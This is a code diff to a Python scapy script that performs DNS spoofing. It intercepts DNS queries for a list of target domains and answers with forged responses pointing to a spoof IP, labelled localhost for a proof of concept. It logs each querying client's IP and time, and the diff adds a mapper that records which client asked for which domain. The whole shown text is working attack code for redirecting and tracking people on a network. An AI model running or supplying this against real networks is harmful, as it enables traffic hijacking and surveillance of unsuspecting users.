@@ -1,7 +1,7 @@
 from scapy.all import * #type:ignore
 from pathlib import Path
 from data.data_helper import record_entry
-
+from cli_mapper import ClientMapper
 import time
 
 
@@ -15,7 +15,8 @@ def load_urls() -> dict[str,str]:
     
 URLS: dict[str,str] = load_urls()
 SPOOF_IP = "127.0.0.1"        # IP to redirect to (localhost for PoC)
-INTERFACE = "en1"             # Your network interface (check with `ifconfig`)
+INTERFACE = "en1"             # Your network interface (check with `ifconfig
+MAPPER = ClientMapper()
 
 def dns_spoof(pkt):
     # Check if packet is a DNS query
@@ -25,7 +26,7 @@ def dns_spoof(pkt):
         qname = pkt[DNSQR].qname.decode().rstrip(".")#type:ignore
         if qname in URLS.keys():
             #print(f"Intercepted DNS query for {qname}")
-
+            srcip = pkt[IP].src
             # Craft spoofed DNS response
             spoofed_pkt = (
                 IP(dst=pkt[IP].src, src=pkt[IP].dst) /#type:ignore
@@ -45,6 +46,7 @@ def dns_spoof(pkt):
                 time.sleep(0.1)
             print(f"Spoofed DNS response sent: {qname} -> {SPOOF_IP}")
             record_entry(qname,build_dict_from_packet(pkt))
+            MAPPER.add_client(srcip,qname) #type:ignore
             
 def build_dict_from_packet(pkt) -> dict[str,str]:
     return {"IP":pkt[IP].src,"Time":time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())}
